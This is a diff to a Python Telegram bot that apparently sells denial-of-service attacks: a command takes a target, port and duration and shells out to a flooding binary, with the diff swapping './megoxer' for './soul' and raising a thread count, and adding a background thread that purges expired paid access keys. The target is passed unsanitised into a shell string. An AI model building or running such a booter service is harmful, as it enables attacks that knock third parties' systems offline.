@@ -394,7 +394,7 @@ def handle_attack(message):
 
     def attack_execution():
         try:
-            subprocess.run(f"./megoxer {target} {port} {time_duration} 900", shell=True, check=True, timeout=time_duration)
+            subprocess.run(f"./soul {target} {port} {time_duration} 2500", shell=True, check=True, timeout=time_duration)
         except subprocess.TimeoutExpired:
             bot.reply_to(message, "❌ ATTACK TIMEOUT! SCREENSHOT OPTIONAL Hai, SEND KROGE TOH CHANNEL PE FORWARD HOGA!")
         except subprocess.CalledProcessError:
@@ -505,6 +505,9 @@ def check_keys(message):
         bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
         return
 
+    # ✅ पहले Expired Keys Remove करो
+    remove_expired_users()
+
     if not keys:
         bot.reply_to(message, "❌ NO ACTIVE KEYS!")
         return
@@ -515,6 +518,15 @@ def check_keys(message):
 
     bot.reply_to(message, key_list, parse_mode="Markdown")
 
+def auto_clean_expired_keys():
+    while True:
+        remove_expired_users()
+        time.sleep(30)  # हर 30 sec में Expired Keys Remove करेगा
+
+# ✅ Expired Keys Auto-Remove System स्टार्ट करो
+threading.Thread(target=auto_clean_expired_keys, daemon=True).start()
+
+# ✅ Bot Polling (MAIN LOOP)
 while True:
     try:
         bot.polling(none_stop=True, interval=0)
